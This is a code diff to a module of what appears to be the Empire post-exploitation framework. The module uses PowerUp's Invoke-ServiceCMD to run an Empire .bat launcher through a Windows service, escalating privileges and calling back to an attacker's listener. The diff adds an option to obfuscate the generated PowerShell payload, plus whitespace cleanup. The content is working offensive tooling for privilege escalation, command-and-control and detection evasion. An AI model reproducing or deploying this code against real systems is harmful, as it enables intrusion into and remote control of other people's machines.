@@ -1,3 +1,4 @@
+import os.path
 from lib.common import helpers
 
 class Module:
@@ -14,13 +15,13 @@ class Module:
             'Background' : True,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : False,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp'
             ]
@@ -59,7 +60,7 @@ class Module:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
-            }     
+            }
         }
 
         # save off a copy of the mainMenu object to access external functionality
@@ -73,10 +74,10 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         moduleName = self.info["Name"]
-        
+
         # read in the common powerup.ps1 module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/PowerUp.ps1"
 
@@ -99,7 +100,7 @@ class Module:
         if not self.mainMenu.listeners.is_listener_empire(listenerName):
             print helpers.color("[!] Empire listener required!")
             return ""
-        
+
         # generate the .bat launcher code to write out to the specified location
         l = self.mainMenu.stagers.stagers['launcher_bat']
         l.options['Listener']['Value'] = self.options['Listener']['Value']
@@ -114,11 +115,15 @@ class Module:
         script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
         script += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
         script += "\"Launcher bat written to $tempLoc `n\";\n"
-  
+
         if launcherCode == "":
             print helpers.color("[!] Error in launcher .bat generation.")
             return ""
 
         script += "Invoke-ServiceCMD -ServiceName \""+serviceName+"\" -CMD \"C:\Windows\System32\cmd.exe /C `\"$env:Temp\debug.bat`\"\""
-            
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
